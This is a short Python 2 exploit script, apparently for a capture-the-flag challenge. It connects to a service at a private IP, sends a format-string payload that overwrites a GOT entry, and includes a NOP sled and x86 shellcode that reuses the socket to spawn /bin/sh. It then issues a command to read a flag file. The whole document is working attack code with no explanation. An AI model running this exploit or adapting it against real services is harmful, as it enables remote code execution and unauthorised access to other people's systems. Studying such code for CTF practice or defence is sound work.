#!/usr/bin/python

import os,sys 
import struct
import socket
import time

fp = open("in","wb+")

shellcode_addr = 0xffffd195

HOST = "10.1.35.27"
PORT = 5555

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

time.sleep(1)

shellcode =  "\x54\x59\x6a\x7f\x54\x51\x6a\x7f\x54\x59\x6a\x07\x5b\xff\x09\x6a"
shellcode += "\x66\x58\xcd\x80\x85\xc0\x75\xf5\x5b\x6a\x02\x59\x6a\x3f\x58\xcd"
shellcode += "\x80\x49\x79\xf8\x41\x31\xd2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
shellcode += "\x62\x69\x89\xe3\x6a\x0b\x58\xcd\x80"

payload = "y\n"
payload += "B"*3		# junk
payload += struct.pack("<I",0x804a018)
payload += struct.pack("<I",0x804a018+1)
payload += struct.pack("<I",0x804a018+2)
payload += struct.pack("<I",0x804a018+3)
payload += "A"*(185 - len(payload))
payload += "%s%s"

## already reached 0x95
payload += "%13$hn"
payload += "%"+str(0xd1-0x95)+"c"
payload += "%14$hn"
payload += "%"+str(0xff-0xd1)+"c"
payload += "%15$hn"
payload += "%16$hn"
payload += "\x90"*120
payload += shellcode
print len(payload)+10
payload += "\n"

s.send(payload)

print "[+] Sent payload of size : "+str(len(payload))
print "[+] Payload = ",''.join('\\x%02x'%ord(c) for c in payload)
time.sleep(1)
print s.recv(1024)
time.sleep(1)
print s.recv(1024)

s.send("cat /home/rsbo/flag")
print s.recv(1024)

fp.write(payload)
fp.close()
